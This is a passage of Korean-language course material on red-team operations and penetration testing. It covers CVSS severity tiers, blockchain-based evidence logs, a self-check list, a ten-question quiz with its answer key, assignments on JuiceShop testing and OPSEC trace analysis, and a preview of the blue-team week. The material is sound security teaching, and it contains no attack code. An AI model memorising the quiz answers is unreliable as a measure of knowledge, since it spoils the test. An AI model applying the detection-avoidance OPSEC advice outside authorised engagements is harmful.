| **Critical** | 9.0-10.0 | 즉시 (24시간) | RCE, SQLi(데이터 유출), 인증 우회 |
| **High** | 7.0-8.9 | 7일 이내 | IDOR, 권한 상승, 민감 데이터 노출 |
| **Medium** | 4.0-6.9 | 30일 이내 | XSS, 설정 오류, CSRF |
| **Low** | 0.1-3.9 | 다음 릴리즈 | 정보 노출, 미사용 포트, 약한 암호 정책 |
| **Informational** | 0.0 | 참고 | 모범 사례 미준수, 개선 제안 |

## 4.3 증적의 법적 가치

### PoW 기반 증적의 특성

| 특성 | 설명 | 법적 의미 |
|------|------|----------|
| **불변성** | 블록체인에 기록된 증적은 변조 불가 | 증거 무결성 보장 |
| **시간 증명** | 각 블록에 타임스탬프 포함 | 행위 시점 증명 |
| **실행자 식별** | agent_id로 실행 주체 특정 | 책임 소재 명확 |
| **연쇄 검증** | 이전 블록 해시로 순서 보장 | 행위 순서 증명 |
| **독립 검증** | `/pow/verify`로 제3자 검증 가능 | 감사 추적 가능 |

### 증적 관리 모범 사례

| 항목 | 권장 사항 | OpsClaw 구현 |
|------|----------|-------------|
| 모든 행위 기록 | 성공/실패 모두 기록 | execute-plan 자동 기록 |
| 타임스탬프 | 각 행위에 시각 기록 | PoW 블록 ts_raw |
| 변조 방지 | 기록 후 수정 불가 | 블록체인 해시 체인 |
| 범위 외 활동 금지 | RoE 범위 내만 테스트 | risk_level, permission_engine |
| 주기적 백업 | 증적 데이터 백업 | PostgreSQL 백업 |

---

## 검증 체크리스트

실습 완료 후 다음 항목을 스스로 확인한다:

- [ ] PTES 7단계를 순서대로 나열하고 각 단계의 산출물을 설명할 수 있는가?
- [ ] RoE(Rules of Engagement)의 필수 항목 8가지를 나열할 수 있는가?
- [ ] OpOrder의 5단락 구조를 설명할 수 있는가?
- [ ] 레드팀, 침투 테스트, 취약점 평가의 차이를 설명할 수 있는가?
- [ ] OPSEC 5단계 프로세스를 설명할 수 있는가?
- [ ] OpsClaw에서 PTES 전 과정을 프로젝트로 구현할 수 있는가?
- [ ] CVSS 기반 취약점 심각도 분류를 적용할 수 있는가?
- [ ] PoW 기반 증적의 법적 가치를 설명할 수 있는가?
- [ ] 전문 침투 테스트 보고서의 6개 섹션 구조를 설명할 수 있는가?
- [ ] 공격 트리(Attack Tree)를 설계하고 해석할 수 있는가?

---

## 자가 점검 퀴즈 (10문항)

**Q1.** PTES 7단계 중 "고객과 범위/규칙을 합의하는 단계"는?
- (a) 정보 수집  (b) **사전 교류(Pre-engagement)**  (c) 위협 모델링  (d) 보고서

**Q2.** RoE에서 반드시 포함해야 하는 "절대 공격 금지 시스템"을 정의하는 항목은?
- (a) 범위  (b) **제외 대상**  (c) 허용 기법  (d) 비상 연락

**Q3.** OPSEC에서 레드팀이 가장 주의해야 할 것은?
- (a) 공격 속도  (b) **작전 활동이 남기는 로그와 흔적**  (c) 도구 라이선스  (d) 보고서 양식

**Q4.** CVSS 점수 9.5는 어떤 심각도로 분류되는가?
- (a) Medium  (b) High  (c) **Critical**  (d) Low

**Q5.** OpsClaw에서 레드팀 작전의 증적이 자동 기록되는 시스템은?
- (a) 파일 로그  (b) **PoW 블록체인 + evidence**  (c) 이메일  (d) Slack

**Q6.** 침투 테스트 보고서에서 "경영진 요약"의 주된 독자는?
- (a) 개발자  (b) 시스템 관리자  (c) **CISO, CTO**  (d) 외부 감사인

**Q7.** OpOrder의 5단락 중 "역할 분담과 시간표"가 포함되는 단락은?
- (a) 상황  (b) 임무  (c) **실행**  (d) 보급/지원

**Q8.** 레드팀과 침투 테스트의 가장 큰 차이점은?
- (a) 사용 도구  (b) **은밀성 요구와 방어팀 비인지 여부**  (c) 보고서 양식  (d) 비용

**Q9.** PoW 블록 검증에서 `tampered: ["block_5"]`가 의미하는 것은?
- (a) 5번 블록이 성공  (b) **5번 블록의 증적이 변조되었음**  (c) 5개 블록 존재  (d) 5번째 실행

**Q10.** PTES에서 "방어자가 직접 관찰할 수 없는" 공격 단계와 가장 관련 깊은 것은?
- (a) 정보 수집  (b) 취약점 분석  (c) **위협 모델링(공격자의 내부 계획)**  (d) 보고서

**정답:** Q1:b, Q2:b, Q3:b, Q4:c, Q5:b, Q6:c, Q7:c, Q8:b, Q9:b, Q10:c

---

## 과제

### 과제 1: 완전한 레드팀 작전 계획 (필수)
다음을 포함하는 완전한 레드팀 작전 계획서를 작성하라:
- RoE 문서 (8개 필수 항목 모두 포함)
- OpOrder (5단락 구조)
- 공격 트리 (최소 3개 OR 노드, 각 2개 이상 AND 조건)
- 타임라인 (Phase 1-5 시간 배분)

### 과제 2: 침투 테스트 보고서 작성 (필수)
실습에서 수행한 JuiceShop 침투 테스트 결과를 전문 보고서로 작성하라:
- 보고서 6개 섹션 구조 준수
- 발견된 각 취약점에 CVSS 점수 부여 및 근거 설명
- 각 취약점의 PoC 명령어와 실행 결과 포함
- 리미디에이션 권고 (구체적 코드/설정 수정 방안 포함)

### 과제 3: OPSEC 분석 (선택)
실습에서 수행한 공격이 남긴 흔적을 분석하라:
- Suricata, Apache, Wazuh 로그에서 자신의 활동 흔적을 찾아라
- 어떤 활동이 탐지되었고, 어떤 활동이 탐지되지 않았는가?
- OPSEC을 강화하기 위한 구체적 방안을 3가지 이상 제안하라

---

## 다음 주 예고

**Week 12: 블루팀 운영 — SOC 구축, SIEM(Wazuh), SOAR 자동화, IR 플레이북**
- SOC(Security Operations Center)의 Tier 1/2/3 구조와 운영 프로세스
- Wazuh SIEM을 활용한 실시간 모니터링 및 알림 구성
- SOAR 자동화 플레이북 설계 및 OpsClaw 연동
- 인시던트 대응(IR) 절차와 실습
